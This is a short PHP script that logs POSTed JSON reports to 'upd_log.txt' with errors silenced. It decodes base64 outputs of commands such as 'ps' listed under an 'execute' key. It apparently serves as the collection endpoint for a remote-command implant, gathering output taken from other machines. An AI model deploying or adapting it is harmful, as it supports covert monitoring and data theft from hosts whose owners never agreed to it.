<?php

error_reporting(0);

$report = $_POST['report'];
$log = fopen("upd_log.txt", "a");
fwrite($log, $report);
fclose($log);

#print_r(json_decode($report));

$decoded = json_decode($report, true);
//print_r($decoded);

//print base64_decode($decoded['execute']['ps']);

if ($decoded['execute'])  {
    foreach ($decoded['execute'] as $command => $output)  {
        $output = base64_decode($output);
        //print ("CMD: $command -- $output\n");
    }
}

//print ("OK");

?>
